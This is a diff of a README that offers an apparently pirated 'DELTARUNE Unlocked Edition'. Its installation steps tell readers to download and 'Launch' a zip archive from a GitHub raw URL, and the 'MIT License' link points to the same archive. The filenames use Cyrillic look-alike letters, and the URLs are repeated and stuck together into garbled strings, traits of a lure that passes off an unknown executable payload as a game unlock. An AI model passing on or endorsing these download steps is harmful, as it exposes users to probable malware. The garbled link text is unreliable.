@@ -29,9 +29,9 @@ DELTARUNE, save editor, unlock, full game, bonus chapters, no restrictions, 2025
 
 ## 📦 Installation
 
-1. Download **https://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/Lоader.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zip** from the repository.
 2. Extract using WinRAR, 7zip, or built-in archiver.
-3. Launch **https://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/Lоader.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/Lоader.zip** and follow the instructions.
+3. Launch **https://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zip** and follow the instructions.
 4. Enjoy the full DELTARUNE experience!
 
 ## ⚠️ Disclaimer
@@ -40,6 +40,6 @@ For educational and backup purposes only. Please support the developers by purch
 
 ## 📜 License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/Lоader.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/Lоader.zip) (2025).
+Licensed under the [MIT License](https://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zipоhttps://raw.githubusercontent.com/JoOdSy/DELTARUNE-Unlocked-Edition/main/ventroptosis/Unlocked-DELTARUN-Edition-v1.8.zip) (2025).
 
 Happy unlocking!
